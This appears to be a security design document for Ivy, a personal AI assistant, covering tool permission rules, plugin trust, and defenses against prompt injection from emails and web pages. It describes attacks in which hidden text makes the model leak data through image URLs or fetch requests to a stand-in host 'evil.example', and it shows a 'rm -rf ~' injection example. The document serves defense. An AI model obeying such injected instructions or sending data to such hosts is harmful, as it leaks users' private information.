# Security

> What runs without asking, what a plugin or a page can do, and what outside content may make Ivy do. Part of the [design](../DESIGN.md); memory's own scan is in [memory.md](memory.md#safety).

## Permission gate


Every tool declares a **risk level**:

| Risk | Examples | Default |
|---|---|---|
| `read` | search memory, read a file, list emails | allow |
| `write` | save a note, edit a local file, create a draft | ask (allowable by rule or *Always*) |
| `external` | send an email, post a message, accept an invite | ask (allowable by rule or *Always*) |
| `dangerous` | a command outside the sandbox (DESIGN §8.3), deleting data, a change to `SOUL.md` | always ask (Yes/No only, no rule allows it), show full input |

Rules are tool-name globs (`*` matches anything). No rules on arguments ("allow `git status*`"): they are easy to slip past (`git status; rm -rf ~`); commands are bounded by a sandbox (DESIGN §8.3).

```toml
[permissions]
allow = ["gmail__*"]        # everything from the mail MCP server (via the bridge) runs without asking...
ask   = ["gmail__send"]     # ...except sending, which is always confirmed
deny  = ["shell__*"]
```

- **`ask` carves exceptions out of a wildcard `allow`** (as in Claude Code's `allow`/`ask`/`deny`), and also forces a confirmation for a tool whose declared risk you don't trust.

- **Precedence:** `deny` > in a conversation off the record (DESIGN §5.4), a tool that writes Ivy's own records or who she is (`own`, not `read`: memory, her journal, a proposal for `SOUL.md`), which doesn't run, the model told why > `ask` > dangerous tools, calls a tool asks about every time (its `askFirst`, e.g. memory writes in a tainted turn, memory.md), and `external` tools in a tainted turn (so what a page or a mail told the model can't go out without the user), always ask > allow (`allow` rules, learned "Always" rules, plugin defaults, "for this session") > the risk level's default (`read` runs, everything else asks). A denied call is rejected without asking, and the model is told it was blocked by a rule.
- **Risk levels are declared by plugins and not verified.** A plugin could label a risky tool `read`. The gate protects against the *model* misusing tools, not against a malicious plugin ([trust model](#trust-model)). `ask` rules let the user force a confirmation for any tool, and `/status` lists every tool with its declared risk.
- **Sources:** all rules live in `config.toml`, so reading the config shows everything that runs without asking. *Always* adds the tool to `[permissions] allow` (DESIGN §7).
- **A prompt** says why it asks (a `write` tool, an `ask` rule, ...) and shows the input, in full for `dangerous` tools. Remembering the answer (*for this session*, *Always*) is offered only where it takes effect, not for `dangerous` tools, `ask` rules, a call a tool asks about every time or an `external` tool in a tainted turn, and the kernel holds to that whatever a client sends.
- **Plugin defaults:** a tool may set `defaultAllow: true` (low-impact tools such as memory saves; not allowed on `dangerous` tools); user `deny` and `ask` rules still win.
- "For this session" choices belong to their session: a new session starts with none, and they last while the process that holds them runs (they aren't saved).
- A prompt no one answers is refused after a while, and the model is told no one answered rather than that the user said no.
- **Permission modes:** how an "ask" is resolved, which is why the four risk levels stay distinct.
  - **Ask** (the default): as above.
  - **Auto** (M5, chosen by the user in the settings): a classifier model (the helper model, DESIGN §5.2) decides whether a `write` or `external` call is one the user asked for, and asks when it can't tell or fails. It sees only what the user wrote and the call, never tool results or other outside content, so text injected there has no say in it. The choice is the user's (DESIGN §13). It is a convenience, not a boundary: `deny` and `ask` rules hold, `dangerous` tools, calls a tool asks about every time, and `external` tools in a tainted turn (memory.md) are still asked (a command in the sandbox may run, its worst bounded, DESIGN §8.3), and a call it let through shows as such in the transcript.
  - **Unattended** (jobs that need tools, from M6): writes run, except those a tool asks about every time, which a job makes as `ext` archive entries (memory.md); external actions wait for the user, dangerous ones and the shell are denied.

## Trust model


- Plugins run **in-process** (in the daemon) with full user permissions. Only install plugins you have read or written. A plugin's declared risk levels and its `setup()` are trusted as code; nothing enforces them.
- **Isolation trigger:** before Ivy loads third-party plugins from `~/.ivy/plugins/` (M5), revisit running plugins in a separate process or sandbox, with file and network access only through kernel APIs that enforce the declared risk. MCP servers already run as separate processes (still with the user's permissions).
- The Permission Gate still applies to every tool call, including MCP tools; the vendor's own tools (web search) never pass through it, so a `deny` rule matching `web_search` or `web__web_search` (so `web__*` too) keeps it out of the request; `allow` and `ask` rules don't apply to it.
- Tool *results* from outside sources (emails, web pages, RSS) are untrusted data. The built-in `rules.md` tells the model not to follow instructions found inside them, and `write`/`external` tools ask unless the user allowed them, `external` ones every time in a turn that read outside content (memory.md), `dangerous` ones every time, which limits prompt-injection damage.
- **What the window loads can leak too, without a tool.** Text hidden in an email can tell the model to put what it knows into an image's URL (`![](https://evil.example/x.png?d=…)`); a page that loads a reply's images sends it with no one seeing, past every permission prompt. Reported against ChatGPT, Claude.ai and Copilot. So a reply's images wait for a click (interfaces.md). It is not a full defense: a click made without reading the site still sends the URL, and so does opening a link, which carries the same risk. What would do more, and why not now:
  - **Only URLs already in the conversation load** (ChatGPT's way): a URL the model builds can't be among them, as the data wasn't known when they were written. Tools say when their results are outside content (DESIGN §6.2), but this needs more: what Ivy wrote and read back (memory, a file) must not count either, or a URL saved by a tool and read back passes. And it still leaks a little: an injection can list a URL per letter and have the model pick, so a cap on how many load is needed too.
  - **A model judging each URL** would read the same injected text as the one it checks, and is right only most of the time; the boundary has to be a rule, not a judgment. (Auto mode's classifier, [permission gate](#permission-gate), is a convenience the user chooses on top of the rules, and reads none of that text.)
- **`fetch` (M3) is the same channel, with no click at all**: a request to `evil.example/?d=…` carries the data off. So it fetches unasked only a URL the user wrote or a search returned, which can't hold what the model read since; any other is asked about, the whole URL shown, links in a page it fetched included: a page is the attacker's to write, and a tree of links on it, followed one pick at a time, spells out the data (found in Anthropic's server-side `web_fetch` in 2026, which let them through). A cap on fetches per turn bounds what a run of picks the user allows can carry. An address on the user's machine or network is never fetched, redirects and names that resolve there included. A fetched page is read by the helper model (DESIGN §5.2) for what was asked, and the main model gets that answer, not the page: text planted in the page must get through that reading to reach Ivy, which is harder though not impossible, and a long page adds only the answer to the conversation; the main model can't quote the page itself, only ask again (as with Claude Code's WebFetch). The helper reading a page has no tools, so a page that persuades it can only shape its answer, and the answer is outside content all the same (memory.md). Server-side search results reach the main model unread by the helper, as the vendor inserts them; they are outside content too.

## Outside content

- **Outside content (M3):** once a turn has read mail, web pages, search results or other outside content (it is *tainted*; a tool says so of its result, and a vendor's server-side search counts, told from the reply's own search blocks, as it never passes through Ivy's tool loop), nothing it writes reaches the always-injected files without the user: a write that changes the text of an entry, or brings one into `USER.md` or `MEMORY.md`, is asked every time, the line shown, with no *for this session* or *Always* (confirming, finishing or archiving an entry is not), and `IVY.md` is closed to it. `external` tools are asked too ([permission gate](#permission-gate)). Taint starts once the result is read, so calls the model wrote before it are judged as before, and ends when the user speaks again: what Ivy writes then answers the user. A conversation moves from the news to the user's day within a few lines, and one conversation may go on for days, so a taint that lasted the session would soon cover most of what the user says. What it leaves open: the content stays in the context, so an instruction hidden in it for a later turn ("when the user next replies, save …"), or Ivy repeating it then in replies that are no longer marked, is held back only by the model, `rules.md`, the helper reading fetched pages ([trust model](#trust-model)) and writes showing in the transcript (in the window folded under the reply, interfaces.md). Ivy's replies in a tainted turn are marked `outside` in the past conversations plugins read (`history`, DESIGN §6.2): `session_search`, asked for, returns them and taints the turn that finds them; what reads past conversations unasked (the daily note, the journal job, session key points, each turn's recall, M3) leaves them out, keeping the user's own words. A job that read outside content (an agent job, M6, interfaces.md), with no one to ask, writes to the archive marked `ext` instead, and archive hits marked `ext` taint the turn that finds them; only the user can vouch for an `ext` entry (by deleting the mark), as a model could be talked into it. This rests on where text came from, not on recognizing it: a content check by a model would have to read the attacker's text and could be persuaded by it. A checker model that reads only the user's own words may help sort pending entries later.
